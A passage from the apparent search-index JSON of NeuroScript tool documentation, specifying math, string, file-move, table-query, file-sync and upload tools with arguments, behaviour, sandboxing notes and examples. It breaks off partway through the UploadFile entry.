Calculates the sum of two numbers.</li> <li>Syntax: <code>CALL Math.Add(num1: &lt;Number&gt;, num2: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Number): Required. The first number to add.</li> <li><code>num2</code> (Number): Required. The second number to add.</li> </ul> </li> <li>Returns: (Number) The sum (<code>num1 + num2</code>). Result is float64.</li> <li>Example: <code>CALL Math.Add(5, 3.5)</code> -&gt; <code>LAST</code> will be <code>8.5</code>.</li> </ul>"},{"location":"ns/tools/maths/#tool-mathsubtract","title":"Tool: <code>Math.Subtract</code>","text":"<ul> <li>Purpose: Calculates the difference between two numbers.</li> <li>Syntax: <code>CALL Math.Subtract(num1: &lt;Number&gt;, num2: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Number): Required. The number to subtract from.</li> <li><code>num2</code> (Number): Required. The number to subtract.</li> </ul> </li> <li>Returns: (Number) The difference (<code>num1 - num2</code>). Result is float64.</li> <li>Example: <code>CALL Math.Subtract(10, 4)</code> -&gt; <code>LAST</code> will be <code>6.0</code>.</li> </ul>"},{"location":"ns/tools/maths/#tool-mathmultiply","title":"Tool: <code>Math.Multiply</code>","text":"<ul> <li>Purpose: Calculates the product of two numbers.</li> <li>Syntax: <code>CALL Math.Multiply(num1: &lt;Number&gt;, num2: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Number): Required. The first number.</li> <li><code>num2</code> (Number): Required. The second number.</li> </ul> </li> <li>Returns: (Number) The product (<code>num1 * num2</code>). Result is float64.</li> <li>Example: <code>CALL Math.Multiply(6, 7)</code> -&gt; <code>LAST</code> will be <code>42.0</code>.</li> </ul>"},{"location":"ns/tools/maths/#tool-mathdivide","title":"Tool: <code>Math.Divide</code>","text":"<ul> <li>Purpose: Calculates the division of two numbers, returning a float. Handles division by zero.</li> <li>Syntax: <code>CALL Math.Divide(num1: &lt;Number&gt;, num2: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Number): Required. The dividend.</li> <li><code>num2</code> (Number): Required. The divisor.</li> </ul> </li> <li>Returns: (Number | Error) The quotient (<code>num1 / num2</code>). Result is float64. Returns an error if <code>num2</code> is zero.</li> <li>Example: <code>CALL Math.Divide(10, 4)</code> -&gt; <code>LAST</code> will be <code>2.5</code>. <code>CALL Math.Divide(5, 0)</code> -&gt; Returns an error.</li> </ul>"},{"location":"ns/tools/maths/#tool-mathmodulo","title":"Tool: <code>Math.Modulo</code>","text":"<ul> <li>Purpose: Calculates the modulo (remainder) of the division of two integers. Handles division by zero.</li> <li>Syntax: <code>CALL Math.Modulo(num1: &lt;Integer&gt;, num2: &lt;Integer&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Integer): Required. The dividend (must be an integer).</li> <li><code>num2</code> (Integer): Required. The divisor (must be an integer).</li> </ul> </li> <li>Returns: (Number | Error) The integer remainder (<code>num1 % num2</code>). Returns an error if <code>num2</code> is zero.</li> <li>Example: <code>CALL Math.Modulo(10, 3)</code> -&gt; <code>LAST</code> will be <code>1</code>. <code>CALL Math.Modulo(10, 0)</code> -&gt; Returns an error.</li> </ul>"},{"location":"ns/tools/move_file/","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/move_file/#tool-specification-toolmovefile-v01","title":"Tool Specification: <code>TOOL.MoveFile</code> (v0.1)","text":"<ul> <li>Tool Name: <code>TOOL.MoveFile</code></li> <li>Purpose: Moves or renames a file or directory within the allowed filesystem sandbox defined by <code>SecureFilePath</code>.</li> <li>NeuroScript Syntax: <code>CALL TOOL.MoveFile(source, destination)</code></li> <li>Arguments:<ul> <li><code>source</code> (String): Required. The path to the existing file or directory to move, relative to the sandboxed root.</li> <li><code>destination</code> (String): Required. The new path for the file or directory, relative to the sandboxed root.</li> </ul> </li> <li>Return Value: (Map)<ul> <li><code>error</code> (String | null): A string describing the error if the move/rename fails (e.g., source not found, destination exists, permission denied), otherwise <code>null</code>.</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly two string arguments (<code>source</code>, <code>destination</code>) are provided. Returns <code>ErrValidationArgCount</code> if not.</li> <li>Validates both the <code>source</code> and <code>destination</code> paths using <code>SecureFilePath</code> [cite: uploaded:neuroscript_small/pkg/core/security.go] to ensure they resolve within the designated secure working directory sandbox. Returns an appropriate error (e.g., <code>ErrSecurityPathViolation</code>) if validation fails.</li> <li>Checks if the resolved <code>source</code> path exists on the filesystem. Returns an error (e.g., <code>\"Source path does not exist\"</code>) if it does not.</li> <li>Checks if the resolved <code>destination</code> path already exists on the filesystem. To prevent accidental overwrites or ambiguous moves into directories, this tool returns an error (e.g., <code>\"Destination path already exists\"</code>) if the destination path exists. It does not support overwriting.</li> <li>If all validations pass and the destination does not exist, attempts to move/rename the <code>source</code> to the <code>destination</code> using the operating system's rename functionality (e.g., <code>os.Rename</code> in Go).</li> <li>Returns a map <code>{\"error\": null}</code> on success.</li> <li>On failure (permission error, I/O error, etc. during <code>os.Rename</code>), returns a map <code>{\"error\": \"descriptive message\"}</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Relies entirely on the <code>SecureFilePath</code> validation to prevent moving files outside the intended sandbox. The implementation and configuration of <code>SecureFilePath</code> must be robust.</li> </ul> </li> <li>Examples: <pre><code># Rename a file\nVAR result = CALL TOOL.MoveFile(\"old_name.txt\", \"new_name.txt\")\nIF result.error != null THEN\n    EMIT \"Error renaming file: \", result.error\nEND\n\n# Move a file into a subdirectory (assuming subdir exists)\nVAR result_move = CALL TOOL.MoveFile(\"report.txt\", \"reports/final_report.txt\")\nIF result_move.error != null THEN\n    EMIT \"Error moving file: \", result_move.error\nEND\n\n# Attempt to overwrite (will fail)\nCALL TOOL.WriteFile(\"existing.txt\", \"content\")\nVAR overwrite_result = CALL TOOL.MoveFile(\"some_other_file.txt\", \"existing.txt\")\n# overwrite_result.error should be non-null here\nEMIT \"Overwrite attempt error: \", overwrite_result.error\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: Likely <code>pkg/core/tools_fs.go</code>.</li> <li>Use Go's <code>os.Rename(secureSourcePath, secureDestPath)</code> after performing checks.</li> <li>Remember to check for source existence (<code>os.Stat</code>) and destination non-existence (<code>os.Stat</code> returning <code>fs.ErrNotExist</code>) before calling <code>os.Rename</code>.</li> <li>Register the function (e.g., <code>toolFSMoveFile</code>) in <code>pkg/core/tools_register.go</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/query_table/","title":"query_table","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.0 :: id: tool-query-table-spec-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, docs/NeuroData/table.md, docs/NeuroData/references.md, docs/script spec.md, docs/metadata.md :: howToUpdate: Review against implementation in Go. Update version for non-trivial changes to arguments, behavior, or return value.</p>"},{"location":"ns/tools/query_table/#tool-specification-toolquerytable-v01","title":"Tool Specification: <code>TOOL.QueryTable</code> (v0.1)","text":"<ul> <li>Tool Name: <code>TOOL.QueryTable</code></li> <li>Purpose: Reads data from a specified NeuroData Table (<code>.ndtable</code>) source, filters rows based on a condition, and returns selected columns. Provides basic SQL <code>SELECT</code>/<code>WHERE</code> functionality for <code>.ndtable</code> files.</li> <li>NeuroScript Syntax: <code>CALL TOOL.QueryTable(table, [select], [where])</code></li> <li>Arguments:<ul> <li><code>table</code> (String | Reference): Required. Either the string content of an <code>.ndtable</code> file or a <code>[ref:&lt;location&gt;]</code> string pointing to an <code>.ndtable</code> file or block. The location part of a reference will be validated using <code>SecureFilePath</code>.</li> <li><code>select</code> (List[String] | Null, Optional): A NeuroScript list of column name strings to include in the results. Column names must match those defined in the source table's schema. If this argument is omitted, <code>null</code>, or an empty list, all columns defined in the table's schema are returned.</li> <li><code>where</code> (String | Null, Optional): A NeuroScript expression string that is evaluated for each row of the table. Only rows where this expression evaluates to <code>true</code> (according to NeuroScript truthiness rules) are included in the result. If omitted or <code>null</code>, all rows are included (no filtering applied). Within the expression string, values from the current row are accessed using the convention <code>row.&lt;ColumnName&gt;</code> (e.g., <code>row.Status</code>, <code>row.Cost</code>).</li> </ul> </li> <li>Return Value: (List[Map])<ul> <li>On success, returns a NeuroScript list. Each element in the list is a map representing a single row that matched the <code>where</code> clause.</li> <li>Each map contains only the columns specified in the <code>select</code> parameter (or all columns if <code>select</code> was omitted/null/empty). Map keys are the column names (string), and map values are the corresponding data from the row, converted to appropriate NeuroScript types (string, number, boolean).</li> <li>Returns an empty list <code>[]</code> if no rows match the <code>where</code> clause or the table is empty.</li> <li>On fatal error (e.g., table parsing failed, <code>where</code> clause parsing failed, invalid <code>select</code> column), returns <code>null</code> (alternative: return a map <code>{\"error\": \"Error message\"}</code> - TBD during implementation).</li> </ul> </li> <li>Behavior:<ol> <li>Validates argument count and types. Expects 1 required (<code>table</code>) and 2 optional (<code>select</code>, <code>where</code>).</li> <li>Resolves the <code>table</code> argument. If it's a <code>[ref:...]</code>, it securely resolves the path using <code>SecureFilePath</code> and reads the content.</li> <li>Parses the <code>.ndtable</code> content, extracting the schema (column definitions) and data rows according to the <code>.ndtable</code> specification. Returns error if parsing fails.</li> <li>Validates the list of column names provided in the optional <code>select</code> argument against the parsed schema names. Returns error if any selected column does not exist. If <code>select</code> is omitted/null/empty, uses all columns from the schema.</li> <li>If a <code>where</code> clause string is provided:<ul> <li>Parses the <code>where</code> expression string into a NeuroScript Abstract Syntax Tree (AST) once. Returns error if <code>where</code> string is invalid syntax.</li> </ul> </li> <li>Initializes an empty list <code>results = []</code>.</li> <li>Iterates through each data row parsed from the table:<ul> <li>Converts the row's string cell values into appropriate NeuroScript types based on the schema. Handles conversion errors.</li> <li>If a <code>where</code> clause AST exists:<ul> <li>Creates a temporary evaluation scope containing the current row's values, accessible via the <code>row.&lt;ColumnName&gt;</code> convention (e.g., scope maps <code>\"row\"</code> to a map representing the current row).</li> <li>Evaluates the <code>where</code> AST within this scope using the standard NeuroScript expression evaluator.</li> <li>If evaluation results in an error, logs a warning for that row and skips it.</li> <li>If evaluation results in a value that is not NeuroScript <code>true</code>, skips the current row.</li> </ul> </li> <li>(If row was not skipped) Creates a result map containing only the selected columns (with their typed values) for the current row.</li> <li>Appends the result map to the <code>results</code> list.</li> </ul> </li> <li>Returns the final <code>results</code> list.</li> </ol> </li> <li>Security Considerations:<ul> <li>File system access for <code>table</code> references must be sandboxed via <code>SecureFilePath</code>.</li> <li>The <code>where</code> clause uses the NeuroScript expression evaluator, which is sandboxed by design (cannot perform I/O, <code>CALL LLM</code>, etc., directly within the expression). However, overly complex <code>where</code> clauses could potentially consume significant resources during evaluation for very large tables. Tool timeouts could be considered for future robustness.</li> </ul> </li> <li>Examples: <pre><code># Assume workers.ndtable exists and is referenced correctly\n\n# Example 1: Find all available, proficient AI workers, select specific columns\nVAR ai_workers = CALL TOOL.QueryTable(\n    table = \"[ref:data/workers.ndtable]\",\n    select = [\"WorkerID\", \"Name\", \"Endpoint\"],\n    where = \"row.WorkerType == 'AI' AND row.Status == 'available' AND row.SkillLevel == 'proficient'\"\n)\nEMIT \"Available Proficient AI Workers:\"\nEMIT ai_workers # Output will be a list of maps, e.g., [{\"WorkerID\": \"...\", \"Name\": \"...\", \"Endpoint\": \"...\"}]\n\n# Example 2: Find workers with file management skills, return all columns\nVAR file_mgrs = CALL TOOL.QueryTable(\n    table = \"[ref:data/workers.ndtable]\",\n    # 'select' parameter omitted - returns all columns\n    where = \"CALL TOOL.Contains(row.Skills, 'file_mgmt')\" # Assumes TOOL.Contains exists and works\n)\nEMIT \"File Managers (all details):\"\nEMIT file_mgrs # Output will be a list of maps, each containing all columns for matching rows\n\n# Example 3: Get all data for a specific worker\nVAR specific_worker_list = CALL TOOL.QueryTable(\n    table = \"[ref:data/workers.ndtable]\",\n    where = \"row.WorkerID == 'build-server-01'\"\n)\n# Result is a list, potentially empty or with one element\nEMIT \"Details for build-server-01:\"\nEMIT specific_worker_list\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Suggested Location: <code>pkg/core/tools_query.go</code> (new file) or potentially <code>tools_neurodata.go</code>.</li> <li>Requires:<ul> <li>Ability to parse <code>.ndtable</code> schema and data rows (potentially a new function in <code>pkg/neurodata/table/</code> or similar).</li> <li>Integration with the NeuroScript expression parser (<code>pkg/core/parser_api.go</code>).</li> <li>Integration with the NeuroScript expression evaluator (<code>pkg/core/evaluation_main.go</code>), including setting up the <code>row.</code> context.</li> <li>Integration with <code>SecureFilePath</code> for resolving <code>table</code> references.</li> </ul> </li> <li>Register the tool function (e.g., <code>toolQueryTable</code>) in <code>pkg/core/tools_register.go</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/strings/","title":"strings","text":"<p>:: type: NSproject :: subtype: tool_spec_summary :: version: 0.1.0 :: id: tool-spec-summary-string-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_string.go, docs/script_spec.md :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/strings/#tool-specification-summary-string-tools-v01","title":"Tool Specification Summary: String Tools (v0.1)","text":"<p>This document provides an abbreviated overview of the built-in String tools.</p>"},{"location":"ns/tools/strings/#tool-stringstringlength","title":"Tool: <code>String.StringLength</code>","text":"<ul> <li>Purpose: Returns the number of UTF-8 characters (runes) in a string.</li> <li>Syntax: <code>CALL String.StringLength(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to measure.</li> </ul> </li> <li>Returns: (Number) The rune count.</li> <li>Example: <code>CALL String.StringLength(\"\u4f60\u597d\")</code> -&gt; <code>LAST</code> will be <code>2</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringsubstring","title":"Tool: <code>String.Substring</code>","text":"<ul> <li>Purpose: Returns a portion of the string based on rune indices.</li> <li>Syntax: <code>CALL String.Substring(input: &lt;String&gt;, start: &lt;Number&gt;, end: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The source string.</li> <li><code>start</code> (Number): Required. 0-based start index (inclusive).</li> <li><code>end</code> (Number): Required. 0-based end index (exclusive).</li> </ul> </li> <li>Returns: (String) The extracted substring. Returns empty string if indices are invalid/out of bounds.</li> <li>Example: <code>CALL String.Substring(\"abcdef\", 1, 4)</code> -&gt; <code>LAST</code> will be <code>\"bcd\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringtoupper","title":"Tool: <code>String.ToUpper</code>","text":"<ul> <li>Purpose: Converts a string to uppercase.</li> <li>Syntax: <code>CALL String.ToUpper(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to convert.</li> </ul> </li> <li>Returns: (String) The uppercase version of the string.</li> <li>Example: <code>CALL String.ToUpper(\"Hello World\")</code> -&gt; <code>LAST</code> will be <code>\"HELLO WORLD\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringtolower","title":"Tool: <code>String.ToLower</code>","text":"<ul> <li>Purpose: Converts a string to lowercase.</li> <li>Syntax: <code>CALL String.ToLower(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to convert.</li> </ul> </li> <li>Returns: (String) The lowercase version of the string.</li> <li>Example: <code>CALL String.ToLower(\"Hello World\")</code> -&gt; <code>LAST</code> will be <code>\"hello world\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringtrimspace","title":"Tool: <code>String.TrimSpace</code>","text":"<ul> <li>Purpose: Removes leading and trailing whitespace from a string.</li> <li>Syntax: <code>CALL String.TrimSpace(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to trim.</li> </ul> </li> <li>Returns: (String) The string with leading/trailing whitespace removed.</li> <li>Example: <code>CALL String.TrimSpace(\"  some text  \")</code> -&gt; <code>LAST</code> will be <code>\"some text\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringsplitstring","title":"Tool: <code>String.SplitString</code>","text":"<ul> <li>Purpose: Splits a string into a list of substrings based on a specified delimiter.</li> <li>Syntax: <code>CALL String.SplitString(input: &lt;String&gt;, delimiter: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to split.</li> <li><code>delimiter</code> (String): Required. The string to use as a separator.</li> </ul> </li> <li>Returns: (List of Strings) A list containing the substrings.</li> <li>Example: <code>CALL String.SplitString(\"apple,banana,orange\", \",\")</code> -&gt; <code>LAST</code> will be <code>[\"apple\", \"banana\", \"orange\"]</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringsplitwords","title":"Tool: <code>String.SplitWords</code>","text":"<ul> <li>Purpose: Splits a string into a list of words, using whitespace as the delimiter.</li> <li>Syntax: <code>CALL String.SplitWords(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to split into words.</li> </ul> </li> <li>Returns: (List of Strings) A list containing the words.</li> <li>Example: <code>CALL String.SplitWords(\"Split these words\")</code> -&gt; <code>LAST</code> will be <code>[\"Split\", \"these\", \"words\"]</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringjoinstrings","title":"Tool: <code>String.JoinStrings</code>","text":"<ul> <li>Purpose: Joins the elements of a list into a single string, placing a specified separator between elements. Elements are converted to strings if necessary.</li> <li>Syntax: <code>CALL String.JoinStrings(input_slice: &lt;List&gt;, separator: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input_slice</code> (List): Required. The list of items to join.</li> <li><code>separator</code> (String): Required. The string to insert between elements.</li> </ul> </li> <li>Returns: (String) The joined string.</li> <li>Example: <code>SET my_list = [\"one\", 2, \"three\"]</code> -&gt; <code>CALL String.JoinStrings(my_list, \" - \")</code> -&gt; <code>LAST</code> will be <code>\"one - 2 - three\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringreplaceall","title":"Tool: <code>String.ReplaceAll</code>","text":"<ul> <li>Purpose: Replaces all occurrences of a specified substring with another substring.</li> <li>Syntax: <code>CALL String.ReplaceAll(input: &lt;String&gt;, old: &lt;String&gt;, new: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The original string.</li> <li><code>old</code> (String): Required. The substring to be replaced.</li> <li><code>new</code> (String): Required. The substring to replace with.</li> </ul> </li> <li>Returns: (String) The string with all replacements made.</li> <li>Example: <code>CALL String.ReplaceAll(\"this is a test is\", \"is\", \"XX\")</code> -&gt; <code>LAST</code> will be <code>\"thXX XX a test XX\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringcontains","title":"Tool: <code>String.Contains</code>","text":"<ul> <li>Purpose: Checks if a string contains a specified substring.</li> <li>Syntax: <code>CALL String.Contains(input: &lt;String&gt;, substring: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to search within.</li> <li><code>substring</code> (String): Required. The substring to search for.</li> </ul> </li> <li>Returns: (Boolean) <code>true</code> if the substring is found, <code>false</code> otherwise.</li> <li>Example: <code>CALL String.Contains(\"Hello world\", \"world\")</code> -&gt; <code>LAST</code> will be <code>true</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringhasprefix","title":"Tool: <code>String.HasPrefix</code>","text":"<ul> <li>Purpose: Checks if a string starts with a specified prefix.</li> <li>Syntax: <code>CALL String.HasPrefix(input: &lt;String&gt;, prefix: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to check.</li> <li><code>prefix</code> (String): Required. The prefix to check for.</li> </ul> </li> <li>Returns: (Boolean) <code>true</code> if the string starts with the prefix, <code>false</code> otherwise.</li> <li>Example: <code>CALL String.HasPrefix(\"filename.txt\", \"file\")</code> -&gt; <code>LAST</code> will be <code>true</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringhassuffix","title":"Tool: <code>String.HasSuffix</code>","text":"<ul> <li>Purpose: Checks if a string ends with a specified suffix.</li> <li>Syntax: <code>CALL String.HasSuffix(input: &lt;String&gt;, suffix: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to check.</li> <li><code>suffix</code> (String): Required. The suffix to check for.</li> </ul> </li> <li>Returns: (Boolean) <code>true</code> if the string ends with the suffix, <code>false</code> otherwise.</li> <li>Example: <code>CALL String.HasSuffix(\"filename.txt\", \".txt\")</code> -&gt; <code>LAST</code> will be <code>true</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringlinecountstring","title":"Tool: <code>String.LineCountString</code>","text":"<ul> <li>Purpose: Counts the number of lines within a given string.</li> <li>Syntax: <code>CALL String.LineCountString(content: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>content</code> (String): Required. The string content in which to count lines.</li> </ul> </li> <li>Returns: (Number) The number of lines (similar logic to <code>FS.LineCountFile</code>: counts <code>\\n</code>, adds 1 if non-empty and no trailing <code>\\n</code>).</li> <li>Example: <code>SET multi_line = \"Line 1\\nLine 2\\nLine 3\"</code> -&gt; <code>CALL String.LineCountString(multi_line)</code> -&gt; <code>LAST</code> will be <code>3</code>.</li> </ul>"},{"location":"ns/tools/sync_files/","title":"sync_files","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 0.1.0  :: id: tool-spec-sync-files-v0.1  :: status: draft  :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_file_api.go, docs/ns/tools/list_api_files.md, docs/ns/tools/upload_file.md, docs/ns/tools/delete_api_file.md  :: howToUpdate: Update when adding support for other directions (\"down\", \"both\") or changing behavior/return value.</p> <p># Tool Specification: TOOL.SyncFiles (v0.1)</p> <ul> <li>Tool Name: TOOL.SyncFiles (v0.1)</li> <li>Purpose: Synchronizes files between a specified local directory within the sandbox and the Gemini File API storage. This version only supports the \"up\" direction (local to API).</li> <li>NeuroScript Syntax: <pre><code>syncStatsMap := TOOL.SyncFiles(direction, localDirectory, [filterGlobPattern])\n</code></pre></li> <li>Arguments:<ul> <li><code>direction</code> (String): Required. Specifies the synchronization direction. Currently, only <code>\"up\"</code> is supported. Case-insensitive.</li> <li><code>local_dir</code> (String): Required. The path to the local directory within the NeuroScript sandbox environment to synchronize. Subject to <code>SecureFilePath</code> validation. Must be a directory.</li> <li><code>filter_pattern</code> (String): Optional. A glob pattern (e.g., <code>\"*.txt\"</code>, <code>\"images/*\"</code>, <code>\"main.go\"</code>) used to filter files based on their basename within the <code>local_dir</code>. If omitted or null, all files are considered for synchronization.</li> </ul> </li> <li>Return Value: (Map)<ul> <li>On success or partial success: A map containing statistics about the sync operation. Keys include:<ul> <li><code>files_scanned</code> (Number): Total local files encountered during the walk.</li> <li><code>files_filtered</code> (Number): Local files skipped due to the <code>filter_pattern</code>.</li> <li><code>files_uploaded</code> (Number): Files successfully uploaded (new or changed).</li> <li><code>files_deleted</code> (Number): API files successfully deleted (because they were removed locally).</li> <li><code>files_up_to_date</code> (Number): Local files found to be identical to their API counterparts (based on hash).</li> <li><code>upload_errors</code> (Number): Count of errors encountered during upload attempts.</li> <li><code>delete_errors</code> (Number): Count of errors encountered during delete attempts.</li> <li><code>list_errors</code> (Number): Count of errors encountered when initially listing API files (sync aborts if &gt; 0).</li> <li><code>walk_errors</code> (Number): Count of non-critical errors during local directory walk (e.g., permission denied on a sub-item).</li> <li><code>hash_errors</code> (Number): Count of errors calculating local file hashes.</li> </ul> </li> <li>On critical failure: An error (e.g., invalid <code>local_dir</code>, API client not initialized, invalid <code>filter_pattern</code>, failure to list initial API files). A Go-level error will also be returned to the interpreter. Non-critical errors during individual uploads/deletes are reflected in the stats map but do not cause a Go error return.</li> </ul> </li> <li>Behavior (<code>direction=\"up\"</code>):<ol> <li>Validates arguments (<code>direction</code>, <code>local_dir</code> type/security, <code>filter_pattern</code> type). Aborts with an error if invalid.</li> <li>Calls <code>TOOL.ListAPIFiles</code> internally to get the current state of files in the API. Creates a map of these files keyed by their <code>displayName</code>. Aborts with an error if listing fails.</li> <li>Recursively walks the specified <code>local_dir</code>. Keeps track of local relative paths seen.</li> <li>For each local file encountered:     a. Skips if it doesn't match the <code>filter_pattern</code> (if provided). Uses glob matching on the file's base name.     b. Calculates the SHA256 hash of the local file content (handles zero-byte files).     c. Looks up the file's relative path (used as display name) in the API file map.     d. Compares the local hash with the <code>sha256Hash</code> from the API file info.     e. If the file is not in the API map, or if the hashes differ, calls <code>TOOL.UploadFile</code> internally to upload the local file (using the relative path as the display name). Logs errors and increments stats but continues.     f. If the file exists in the API map and hashes match, increments the <code>files_up_to_date</code> stat.</li> <li>After the walk, iterates through the API file map obtained in step 2.</li> <li>For each API file, checks if its <code>displayName</code> was seen during the local walk AND if it would not have been skipped by the filter pattern.</li> <li>If an API file's <code>displayName</code> was not seen locally (and wouldn't be filtered), calls <code>TOOL.DeleteAPIFile</code> internally to delete the file from the API. Logs errors and increments stats but continues.</li> <li>Returns the final statistics map.</li> </ol> </li> <li>Security Considerations:<ul> <li>Requires a valid <code>GEMINI_API_KEY</code> with permissions for List, Upload, Get, and Delete file operations.</li> <li><code>local_dir</code> is validated using <code>SecureFilePath</code>. The walk is confined within this directory.</li> <li>Network access to Google Cloud services is required.</li> <li>Reads all files within the specified <code>local_dir</code> (subject to filtering) and uploads changed/new ones to Google Cloud storage.</li> <li>Deletes files from Google Cloud storage if they are removed locally (subject to filtering).</li> </ul> </li> <li>Examples: <pre><code>// Sync everything in the 'project_files' subdir up to the API\nstats1 := TOOL.SyncFiles(\"up\", \"project_files\")\nIO.Print(\"Sync 1 Stats:\", stats1)\n\n// Sync only Go files in the 'src' subdir up to the API\nstats2 := TOOL.SyncFiles(\"up\", \"src\", \"*.go\")\nIO.Print(\"Sync 2 Stats (Go files):\", stats2)\nIF stats2[\"upload_errors\"] &gt; 0 OR stats2[\"delete_errors\"] &gt; 0 THEN\n    IO.Print(\"  WARNING: Sync encountered errors.\")\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Implemented in <code>pkg/core/tools_file_api.go</code> as <code>toolSyncFiles</code>.</li> <li>Uses <code>filepath.WalkDir</code> for local traversal.</li> <li>Uses <code>filepath.Match</code> for glob pattern matching.</li> <li>Internally calls <code>toolListAPIFiles</code>, <code>toolUploadFile</code>, <code>toolDeleteAPIFile</code>.</li> <li>Needs helper <code>calculateFileHash</code> (adapted from <code>gensync</code>).</li> <li>Registered via <code>registerFileAPITools</code>.</li> <li>Currently only supports <code>direction=\"up\"</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/tool_spec_structure/","title":"tool_spec_structure","text":"<p>:: type: NSproject :: subtype: spec_template :: version: 0.1.0 :: id: tool-spec-structure-template-v0.1 :: status: approved :: dependsOn: docs/metadata.md :: howToUpdate: Review when creating/updating tool specs to ensure this template remains accurate.  </p>"},{"location":"ns/tools/tool_spec_structure/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":"<p>This document outlines the standard structure for documenting NeuroScript built-in tools within the <code>docs/ns/tools/</code> directory. Each tool should have its own markdown file (e.g., <code>io_input.md</code>, <code>tool_fs_movefile.md</code>).</p>"},{"location":"ns/tools/tool_spec_structure/#tool-specification-categorytoolname-vxy","title":"Tool Specification: <code>CATEGORY.ToolName</code> (Vx.y)","text":"<ul> <li>Tool Name: The fully qualified name of the tool (e.g., <code>IO.Input</code>, <code>TOOL.MoveFile</code>). Include a version number (e.g., v0.1) if the spec evolves.</li> <li>Purpose: A brief (1-2 sentence) description of what the tool does and why it's useful.</li> <li>NeuroScript Syntax: A code example showing how the tool is called in NeuroScript. Include placeholders for arguments.</li> <li>Arguments:<ul> <li>A list describing each argument:<ul> <li><code>argument_name</code> (Type): Description of the argument, including whether it's required or optional, and any constraints (e.g., specific format, allowed values).</li> </ul> </li> </ul> </li> <li>Return Value: (Type - e.g., Map, List, String, Number, Boolean, null)<ul> <li>Description of the value returned by the tool upon successful execution.</li> <li>If the return type is a Map, list the expected keys and their value types/meanings. Crucially, specify how errors are indicated (e.g., an <code>error</code> key being non-null).</li> </ul> </li> <li>Behavior:<ul> <li>A numbered or bulleted list describing the step-by-step execution logic of the tool.</li> <li>Detail validation performed on arguments.</li> <li>Specify handling of edge cases (e.g., file not found, empty input, division by zero).</li> <li>Describe how errors are generated and returned.</li> </ul> </li> <li>Security Considerations:<ul> <li>Outline any security implications of using the tool.</li> <li>Specify restrictions (e.g., disallowed in agent mode, reliance on <code>SecureFilePath</code>).</li> <li>Mention potential risks if used improperly.</li> </ul> </li> <li>Examples: (Optional but Recommended)<ul> <li>One or more NeuroScript snippets demonstrating practical usage of the tool, potentially showing different argument combinations or expected outputs.</li> </ul> </li> <li>Go Implementation Notes: (Optional - Primarily for developers implementing the tool)<ul> <li>Suggested location in the Go codebase (e.g., <code>pkg/core/tools_fs.go</code>).</li> <li>Relevant Go packages to use (e.g., <code>os</code>, <code>fmt</code>, <code>go/ast</code>).</li> <li>Key Go functions involved (e.g., <code>os.Rename</code>).</li> <li>Reminder about registration (e.g., in <code>pkg/core/tools_register.go</code>).</li> </ul> </li> </ul>"},{"location":"ns/tools/upload_file/","title":"upload_file","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 0.1.0  :: id: tool-spec-upload-file-v0.1  :: status: draft  :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_file_api.go  :: howToUpdate: Update if arguments, return value structure, or default display name logic changes.</p> <p># Tool Specification: TOOL.UploadFile (v0.1)</p> <ul> <li>Tool Name: TOOL.UploadFile (v0.1)</li> <li>Purpose: Uploads a local file from the NeuroScript sandbox environment to the Gemini File API storage. It waits for the file to become ACTIVE and ready for use in prompts.</li> <li>NeuroScript Syntax: <pre><code>uploadResultMap := TOOL.UploadFile(localFilePath, [optionalDisplayName])\n</code></pre></li> <li>Arguments:<ul> <li><code>local_path</code> (String): Required. The path to the file within the 